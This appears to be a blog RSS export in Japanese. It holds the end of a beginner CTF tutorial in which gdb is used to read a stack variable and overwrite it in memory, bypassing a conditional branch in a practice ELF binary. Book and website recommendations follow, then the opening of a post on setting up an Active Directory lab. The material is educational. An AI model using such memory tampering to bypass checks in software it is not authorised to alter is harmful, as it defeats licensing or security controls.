              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/e96edda2a2e25f369363488ec7a6b81e/8ff5a/image-56.png 240w,
/static/e96edda2a2e25f369363488ec7a6b81e/e85cb/image-56.png 480w,
/static/e96edda2a2e25f369363488ec7a6b81e/0b533/image-56.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/e96edda2a2e25f369363488ec7a6b81e/0b533/image-56.png&quot;
            alt=&quot;2021/12/image-56.png&quot;
            title=&quot;2021/12/image-56.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;次は、フラグレジスタではなく変数の値をメモリから参照した後に改ざんすることで条件分岐をバイパスさせてみたいと思います。&lt;/p&gt;
&lt;h3 id=&quot;メモリの中から情報を抜き出す&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%AE%E4%B8%AD%E3%81%8B%E3%82%89%E6%83%85%E5%A0%B1%E3%82%92%E6%8A%9C%E3%81%8D%E5%87%BA%E3%81%99&quot; aria-label=&quot;メモリの中から情報を抜き出す permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;メモリの中から情報を抜き出す&lt;/h3&gt;
&lt;p&gt;先ほど同様以下の処理を見ていきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;0x00001160      837df801       &lt;span class=&quot;token function&quot;&gt;cmp&lt;/span&gt; dword &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;var_8h&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
0x00001164      &lt;span class=&quot;token number&quot;&gt;7542&lt;/span&gt;           jne 0x11a8&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;今度は&lt;code class=&quot;language-text&quot;&gt;0x00001160&lt;/code&gt;にブレークポイントを設定しましょう。&lt;/p&gt;
&lt;p&gt;そこで&lt;code class=&quot;language-text&quot;&gt;run&lt;/code&gt;コマンドを実行すると、&lt;code class=&quot;language-text&quot;&gt;cmp&lt;/code&gt;命令の呼び出し地点で処理が停止します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ b *0x555555555160
$ run
   0x555555555159 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;main+2&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;0&lt;/span&gt;&gt;&lt;/span&gt;:    mov    DWORD PTR &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;rbp-0x8&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;,0x0
&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x555555555160 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;main+2&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;7&lt;/span&gt;&gt;&lt;/span&gt;:    &lt;span class=&quot;token function&quot;&gt;cmp&lt;/span&gt;    DWORD PTR &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;rbp-0x8&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;,0x1
   0x555555555164 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;main+3&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;:    jne    0x5555555551a8 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;main+9&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;9&lt;/span&gt;&gt;&lt;/span&gt;
   0x555555555166 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;main+3&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;3&lt;/span&gt;&gt;&lt;/span&gt;:    mov    DWORD PTR &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;rbp-0x4&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;,0x0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;このとき、&lt;code class=&quot;language-text&quot;&gt;DWORD PTR [rbp-0x8]&lt;/code&gt;はローカル変数の&lt;code class=&quot;language-text&quot;&gt;is_vulun&lt;/code&gt;の値を参照しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;DWORD PTR [メモリアドレス]&lt;/code&gt;の構文は、&lt;code class=&quot;language-text&quot;&gt;[]&lt;/code&gt;の中に定義されたメモリアドレスをDWORD（32bit符号なし整数）として取得する命令です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;$rbp-0x8&lt;/code&gt;は、ローカル変数の格納されたスタックのアドレスですが、確認してみるとスタックの中には実際の変数の値が格納されているメモリアドレスを関節参照しているようです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;p &lt;span class=&quot;token variable&quot;&gt;$rbp&lt;/span&gt;-0x8
&lt;span class=&quot;token variable&quot;&gt;$16&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;void *&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; 0x7fffffffdce8&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;つまり、実際の&lt;code class=&quot;language-text&quot;&gt;is_vulun&lt;/code&gt;の値は&lt;code class=&quot;language-text&quot;&gt;0x7fffffffdce8&lt;/code&gt;の中に格納されています。&lt;/p&gt;
&lt;p&gt;gdbでは、&lt;code class=&quot;language-text&quot;&gt;x/[format] &amp;lt;address&gt;&lt;/code&gt;コマンドでメモリの中の情報を参照できます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://visualgdb.com/gdbreference/commands/x&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;GDB Command Reference - x command&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上記のドキュメントを見ると、&lt;code class=&quot;language-text&quot;&gt;x/w &amp;lt;address&gt;&lt;/code&gt;としてフォーマットを指定すると、32bit符号なし整数としてメモリ内の情報を取得できることがわかります。&lt;/p&gt;
&lt;p&gt;そのため、以下のコマンドを実行すると、メモリアドレス&lt;code class=&quot;language-text&quot;&gt;0x7fffffffdce8&lt;/code&gt;（変数&lt;code class=&quot;language-text&quot;&gt;is_vulun&lt;/code&gt;）の値が0になっていることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ x/w 0x7fffffffdce8
0x7fffffffdce8: &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;話を条件分岐の処理に戻します。&lt;/p&gt;
&lt;p&gt;ここで、&lt;code class=&quot;language-text&quot;&gt;dword [var_8h]&lt;/code&gt;の値が0であり、&lt;code class=&quot;language-text&quot;&gt;cmp&lt;/code&gt;命令によって1と比較した結果が等しいかどうかを確認していることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;0x00001160      837df801       &lt;span class=&quot;token function&quot;&gt;cmp&lt;/span&gt; dword &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;var_8h&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
0x00001164      &lt;span class=&quot;token number&quot;&gt;7542&lt;/span&gt;           jne 0x11a8&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;そのため、&lt;code class=&quot;language-text&quot;&gt;dword [var_8h]&lt;/code&gt;の値を1に改ざんすることで、条件分岐のバイパスができそうです。&lt;/p&gt;
&lt;p&gt;ここで、特定のメモリ内の値を改ざんする場合にも&lt;code class=&quot;language-text&quot;&gt;set&lt;/code&gt;コマンドを使用できます。&lt;/p&gt;
&lt;p&gt;特定のアドレスの値を変更する際は、以下のリンク先のように&lt;code class=&quot;language-text&quot;&gt;{データ型}&lt;/code&gt;を付与します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://sourceware.org/gdb/current/onlinedocs/gdb/Assignment.html#Assignment&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Assignment (Debugging with GDB)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;実際に、以下のようにしてメモリのデータを改ざんできました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ x/w 0x7fffffffdce8
0x7fffffffdce8: 0x00000000

&lt;span class=&quot;token comment&quot;&gt;# 値の改ざん&lt;/span&gt;
$ &lt;span class=&quot;token builtin class-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;int&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;0x7fffffffdce8 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;

$ x/w 0x7fffffffdce8
0x7fffffffdce8: 0x00000001&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この状態で処理を進めることで、&lt;code class=&quot;language-text&quot;&gt;cmp&lt;/code&gt;命令で値を比較した結果&lt;code class=&quot;language-text&quot;&gt;is_vuln == 1&lt;/code&gt;となるため、条件分岐のバイパスに成功します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/3dcd34a87afb4e114a4b55b19d5dc490/0b533/image-57.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 55.00000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAAB+0lEQVQoz02S65KqMBCEfR1F5GIISSCESwCxvOzWvv+z9Hai7jk/umak8KNnpnfnRqE2Cr1zKGuJpjGYbIdcVbH34wTZtRCqxjaOWKmzkihkhVwKlOzzskSSJDgej9jVUuJ223C/X7GuM8ZpwDD2yE8ZyjyHrAR8Z6EJUFSjaUAIJAcCCImVoKAkIbBtDZ7PG35+vnC9rvB+xLJ4ZEWOSglII7E8PPzi0M8dBtbG6T9H6Sn966NDxVG+v+8EPrFtCy6XOdaCwM4aKI7+9bxi8QNsqzGNHYyWOBwOOJ1OMFzXBxjqThvDMUf4eYbtOrjeUT1ExX1yl6bt6NojzwtCOOIx5Z9TpOlHJ4Kzfw7D7ho3oh1WaoEylsdoUFU1hJAE16i4OyHOhGZUHkGhBlBKl+FDwXF0eLtdYAcPO17g/AZjHXRdUwqtNqjpNEwx8LrjNEX3ztmYgKDQhzv0fRfXRIfbG7iiX25ougGN0ViXhZrpTBCo4wryokSteGXGS/PaARCcn88ldUaWZdiFmNS6YRYtVON4WfN6kTurKMGMWdtGQJBzHYE1JKFFUUDxWZbl2O/3r5EHP6PlmIpQYwln0LXV0VXGPYVsHULe3kuPPZ/F32n6is67xqO0hDStw7RsmHjNx+OKK6MTY8BFf148Hl9Bjn3yDvX/9R2bX1c8ajyUzL/UAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/3dcd34a87afb4e114a4b55b19d5dc490/8ac56/image-57.webp 240w,
/static/3dcd34a87afb4e114a4b55b19d5dc490/d3be9/image-57.webp 480w,
/static/3dcd34a87afb4e114a4b55b19d5dc490/b0a15/image-57.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/3dcd34a87afb4e114a4b55b19d5dc490/8ff5a/image-57.png 240w,
/static/3dcd34a87afb4e114a4b55b19d5dc490/e85cb/image-57.png 480w,
/static/3dcd34a87afb4e114a4b55b19d5dc490/0b533/image-57.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/3dcd34a87afb4e114a4b55b19d5dc490/0b533/image-57.png&quot;
            alt=&quot;2021/12/image-57.png&quot;
            title=&quot;2021/12/image-57.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これでgdbを使ってメモリ情報の参照や改ざんを行うことができました。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;今回はCTFの初心者向けにELFバイナリの基本的な解析手法をまとめてみました。&lt;/p&gt;
&lt;p&gt;この記事は、私が個人的に開催する勉強会のために作成したものですので、もし勉強会などで再利用いただける場合は特に許諾などは不要です。&lt;/p&gt;
&lt;p&gt;参照元としてURLだけ記載いただければ、あとはご自由にご利用ください。&lt;/p&gt;
&lt;p&gt;なお、本記事やその他の内容について質問、指摘事項がある場合は、&lt;a href=&quot;https://twitter.com/yuki_kashiwaba&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Twitter:yuki_kashiwaba&lt;/a&gt; のDMまでお願いします。&lt;/p&gt;
&lt;p&gt;この記事のコメントでも受け付けてますが、Twitter経由の方がレスポンスが早いです。&lt;/p&gt;
&lt;p&gt;この記事が少しでもこれからCTFを始める方の役に立てば幸いです。&lt;/p&gt;
&lt;h2 id=&quot;おすすめの書籍--webサイト&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%8A%E3%81%99%E3%81%99%E3%82%81%E3%81%AE%E6%9B%B8%E7%B1%8D--web%E3%82%B5%E3%82%A4%E3%83%88&quot; aria-label=&quot;おすすめの書籍  webサイト permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;おすすめの書籍 / WEBサイト&lt;/h2&gt;
&lt;p&gt;この記事ではELF解析の入門的な内容にしか触れていないので、より詳細に学びたい方には以下の書籍やWebサイトが役に立つと思いますので、参考までに記載しておきます。&lt;/p&gt;
&lt;h3 id=&quot;書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;書籍&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3lkunSs&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Debug Hacks -デバッグを極めるテクニック&amp;#x26;ツール&lt;/a&gt;
開発者向けのデバッグ本ですが、前半100ページくらいにgdbの基本的な使い方などがまとまっていて非常に参考になります。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3o7g5Gj&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解セキュリティコンテスト&lt;/a&gt;
今からCTFに入門するならとりあえず読んでおくと良い1冊。
解析手法やアセンブリの読み方などかなりわかりやすくまとまってます。
Reversingの項目は何か所か誤植あるようなので、正誤表要確認。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3robIsL&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;リバースエンジニアリングツールGhidra実践ガイド ~セキュリティコンテスト入門からマルウェア解析まで~ &lt;/a&gt;
たぶん日本語で書かれた唯一のGhidra本です。
PEバイナリの解析の内容が多めですが、Ghidraの使い方だけでなく解析手法についてもとても勉強になります。
Ghidra10.0以前の本なのでデバッガについては記載がない点に注意。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3robIsL&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;リバースエンジニアリング ―Pythonによるバイナリ解析技法&lt;/a&gt;
完全にPEバイナリの解析のみについての本ですが、解析手法はELFと共通する部分が多いです。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://booth.pm/ja/items/1058583&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;冴えないIDAの育てかた&lt;/a&gt;
IDAの概要や使い方がまとまってます。
なぜかIDA本なのに1/3くらいのページでradare2の解説がされてます。
日本語でこんなにradare2の情報が充実してる本は出会ったことがないのでとても参考になります。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3oMmsPY&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;動かしながらゼロから学ぶ Linuxカーネルの教科書&lt;/a&gt;
ELFバイナリの解析のためには、ある程度Linuxの仕組みを知っておく必要があります。
個人的には一番入門的な書籍化と思います。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3yhiyBA&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ptrace入門: ptraceの使い方&lt;/a&gt;
今回は使いませんでしたが、ptraceとltraceの解説書です。
筑波大教授の先生が講義で使った資料を書籍化したもののようですが、たったの100円で販売されていて買わない理由がないです。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;webサイト&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#web%E3%82%B5%E3%82%A4%E3%83%88&quot; aria-label=&quot;webサイト permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WEBサイト&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://cs.lmu.edu/~ray/notes/nasmtutorial/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;NASM Tutorial&lt;/a&gt;
英語ですが、インテル記法のアセンブリを読めるようになるための最初の一歩として結構いい情報が多いです。&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;http://asmdebugger.com/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Assembly Debugger Online&lt;/a&gt;
わざわざローカルでgdbを動かさなくても簡単にWebからインテル記法のアセンブリの動作確認ができます。&lt;/p&gt;
&lt;p&gt;ちょっとした挙動が自分の認識とあっているか検証する際などに便利です。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://linuxjm.osdn.jp/index.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;JM Project (Japanese)&lt;/a&gt;
ELF解析をするなら頻繁にライブラリ関数などのmanを確認すると思いますが、manページなどが日本語に翻訳されたページです。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://book.rada.re/first_steps/intro.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;The Official Radare2 Book&lt;/a&gt;
radare2って機能が豊富ですよね。
全然使いこなせてない。。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;※参考情報についてはそのうち気が向いたら追記していきます。沢山ありすぎて書ききれませんでした。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Active Directoryラボ環境を構築する手順とトラブルシューティングの備忘録]]></title><link>https://kashiwaba-yuki.com/windows-activedirectory-lab</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-activedirectory-lab</guid><pubDate>Sun, 05 Dec 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;ラボ環境にAD環境を構築した際の備忘録です。&lt;/p&gt;
&lt;p&gt;とりあえずドメインコントローラの設定とクライアントをADに参加させるところまでの手順とトラブルシューティングについてまとめました。&lt;/p&gt;
&lt;p&gt;また他の構成を試す場合は追記していこうと思います。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#ad%E3%82%B5%E3%83%BC%E3%83%90%E3%81%AE%E6%A7%8B%E7%AF%89&quot;&gt;ADサーバの構築&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#ad%E3%81%AE%E5%9F%BA%E6%9C%AC&quot;&gt;ADの基本&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E7%92%B0%E5%A2%83%E6%83%85%E5%A0%B1&quot;&gt;環境情報&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ad%E3%82%92%E6%9C%89%E5%8A%B9%E5%8C%96%E3%81%99%E3%82%8B&quot;&gt;ADを有効化する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%A9%E3%81%AB%E6%98%87%E6%A0%BC%E3%81%99%E3%82%8B&quot;&gt;ドメインコントローラに昇格する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ip%E5%9B%BA%E5%AE%9A&quot;&gt;IP固定&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ad%E3%81%A8dns%E3%81%AE%E7%A2%BA%E8%AA%8D&quot;&gt;ADとDNSの確認&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ad%E3%83%A6%E3%83%BC%E3%82%B6%E3%81%AE%E8%BF%BD%E5%8A%A0&quot;&gt;ADユーザの追加&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%82%B5%E3%83%BC%E3%83%90%E3%82%92ad%E3%81%AB%E5%8F%82%E5%8A%A0%E3%81%95%E3%81%9B%E3%82%8B&quot;&gt;サーバをADに参加させる&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
